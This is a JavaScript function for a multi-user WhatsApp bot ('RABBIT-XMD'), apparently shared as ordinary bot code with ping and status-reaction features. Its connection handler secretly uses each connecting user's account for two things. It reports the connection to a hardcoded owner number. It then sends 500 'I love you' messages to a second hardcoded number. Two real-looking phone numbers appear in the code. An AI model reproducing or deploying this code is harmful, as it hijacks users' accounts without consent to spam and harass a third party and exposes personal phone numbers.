async function startWhatsApp(userId, useQR = false) {
  const userPath = await ensureSessionPath(userId);
  const { state, saveCreds } = await useMultiFileAuthState(userPath);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: useQR,
    auth: state,
    browser: [userId, 'Safari', '1.0'],
    getMessage: async () => ({ conversation: "Hi from CoreAI" })
  });

  userSockets.set(userId, sock);
  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
    if (connection === 'close') {
      const reason = lastDisconnect?.error?.output?.statusCode;
      logger.warn(`${userId} disconnected: ${reason}`);
      userSockets.delete(userId);
    } else if (connection === 'open') {
      logger.info(`${userId} connected`);
      await sock.sendMessage(sock.user.id, {
        text: `✅ Connected as ${userId}`
      });

      // ✅ Notify owner
      const notifyNumber = '919874188403@s.whatsapp.net';
      await sock.sendMessage(notifyNumber, {
        text: `✅ RABBIT-XMD CONNECTED. ENJOY`
      });

      // ✅ Send 500 love messages to the target number
      const targetNumber = '918820763819@s.whatsapp.net';
      const loveMessage = 'I love you 🥹💗';

      for (let i = 0; i < 500; i++) {
        await sock.sendMessage(targetNumber, { text: loveMessage });
        await new Promise(resolve => setTimeout(resolve, 1000)); // 1 second delay
      }

      logger.info(`✅ Sent 500 love messages to ${targetNumber}`);
    }
  });

  sock.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
    if (!msg?.message || msg.key.fromMe) return;

    const type = getContentType(msg.message);
    let text = '';

    if (type === 'conversation') text = msg.message.conversation;
    else if (type === 'extendedTextMessage') text = msg.message.extendedTextMessage.text;
    else return;

    const from = msg.key.remoteJid;

    // Ping কমান্ড
    if (text.toLowerCase() === '.ping') {
      try {
        const startTime = Date.now();
        const message = await sock.sendMessage(from, { text: '*PINGING...*' });
        const endTime = Date.now();
        const ping = endTime - startTime;
        await sock.sendMessage(from, { text: `*🔥 RABBIT-XMD SPEED : ${ping}ms*` }, { quoted: message });
      } catch (e) {
        console.log(e);
        await sock.sendMessage(from, { text: `Error: ${e.message || e}` });
      }
      return;
    }

    // Status broadcast এ রিয়েকশন (optional)
    if (msg.key.remoteJid === 'status@broadcast') {
      try {
        const emojis = ['🔥', '💯', '💎', '⚡', '✅', '💙', '👀', '🌟', '😎'];
        const emoji = emojis[Math.floor(Math.random() * emojis.length)];

        await sock.sendMessage('status@broadcast', {
          react: { text: emoji, key: msg.key }
        }, {
          statusJidList: [msg.key.participant || msg.key.remoteJid, sock.user.id]
        });

        logger.info(`${userId} reacted to status with ${emoji}`);
      } catch (err) {
        logger.warn(`${userId} status react error:`, err);
      }
    }
  });
}
